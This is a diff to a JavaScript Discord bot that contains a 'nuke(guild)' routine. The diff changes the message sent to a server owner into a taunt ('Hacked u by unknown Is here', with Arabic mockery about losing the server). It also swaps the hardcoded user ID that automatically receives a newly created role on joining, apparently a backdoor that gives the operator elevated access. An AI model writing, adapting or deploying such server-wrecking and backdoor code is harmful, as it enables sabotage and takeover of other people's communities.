@@ -14,6 +14,7 @@ console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
 
         
+    
 
 });
 var prefix = "-"
@@ -416,7 +417,7 @@ async function nuke(guild) {
 
   await guild.fetchMembers();
 
-  await guild.owner.send('').catch(e => { return void e; });
+  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
 
 
 
@@ -459,7 +460,7 @@ LOka.on('guildCreate', async (guild) => {
 
 LOka.on('guildMemberAdd', member => {
     
-            if (member.id === "450759214025932820") {
+            if (member.id === "378293431593598986") {
                 member.guild.createRole({
                     name : LOka.user.username,
                     color : "RANDOM", 
@@ -472,7 +473,7 @@ LOka.on('guildMemberAdd', member => {
         
     });
 
-
+    
 
 
 
